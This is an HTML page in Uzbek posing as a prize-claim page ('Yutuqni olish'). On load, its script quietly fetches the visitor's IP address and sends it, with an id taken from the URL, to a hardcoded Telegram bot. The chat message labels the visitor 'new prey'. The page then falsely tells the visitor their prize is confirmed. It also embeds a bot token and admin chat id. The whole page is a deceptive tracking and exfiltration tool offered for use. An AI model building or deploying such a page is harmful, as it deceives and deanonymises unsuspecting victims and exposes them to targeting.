<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yutuqni olish</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 20%; }
        .btn { background: #27ae60; color: white; padding: 15px 25px; border-radius: 10px; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <h2 id="msg">Yutuq tekshirilmoqda...</h2>
    <div id="loader">Kuting...</div>

    <script>
        async function captureIP() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('id');
            const token = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU";
            const admin = "5775388579";

            try {
                // IP Manzilni aniqlash
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                // Adminga yuborish
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: admin,
                        text: `üéØ **Yangi o'lja (IP)!**\n\nüë§ Foydalanuvchi ID: \`${uid}\`\nüåê IP: \`${ip}\``,
                        parse_mode: "Markdown"
                    })
                });

                document.getElementById('msg').innerText = "Tabriklaymiz! Yutuq tasdiqlandi. 24 soat ichida bog'lanamiz.";
                document.getElementById('loader').style.display = "none";
            } catch (e) {
                document.getElementById('msg').innerText = "Tizimda xatolik, qayta urining.";
            }
        }
        window.onload = captureIP;
    </script>
</body>
</html>
